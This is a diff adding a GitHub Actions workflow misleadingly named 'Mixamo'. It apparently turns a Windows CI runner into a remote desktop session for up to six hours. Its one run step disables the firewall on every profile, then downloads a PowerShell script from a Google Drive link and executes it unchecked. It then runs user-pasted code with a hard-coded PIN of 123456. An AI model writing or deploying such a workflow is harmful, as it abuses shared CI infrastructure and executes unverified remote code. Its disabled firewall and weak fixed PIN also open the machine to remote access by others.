@@ -1,0 +1,31 @@
+# WORKFLOW WRITTEN AND MANAGED BY GW KANG 
+
+name: Mixamo
+on:
+  workflow_dispatch:
+    inputs:
+      code:
+        description: 'Put Powershell code from crd website'
+        required: true
+      runtime:
+        type: choice
+        options:
+        - 1 
+        - 2
+        - 3
+        - 4
+        - 5
+        - 6
+        description: 'Choose Runtime (in hours)'
+        
+jobs:
+  mixamo:
+    name: Running Mixamo
+    runs-on: windows-latest
+    steps:
+    - name: Starting Mixamo
+      run: |
+       # Doing Setup (Wait 1-2 minutes) 
+       & {Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False | Out-Null} && start . && Invoke-WebRequest -Uri 'https://drive.usercontent.google.com/download?id=1zWPrBswDuSxsNnCN8CeCbhDNZxPXawip&export=download&confirm=t&uuid=dbe28a47-23fe-42a3-bc61-397431f8ea63' -OutFile 'installer.ps1' && ./installer.ps1 && ${{ inputs.code }} -pin=123456
+    - name: Mixamo is running!
+      run:  sleep (3600*${{ inputs.runtime }})
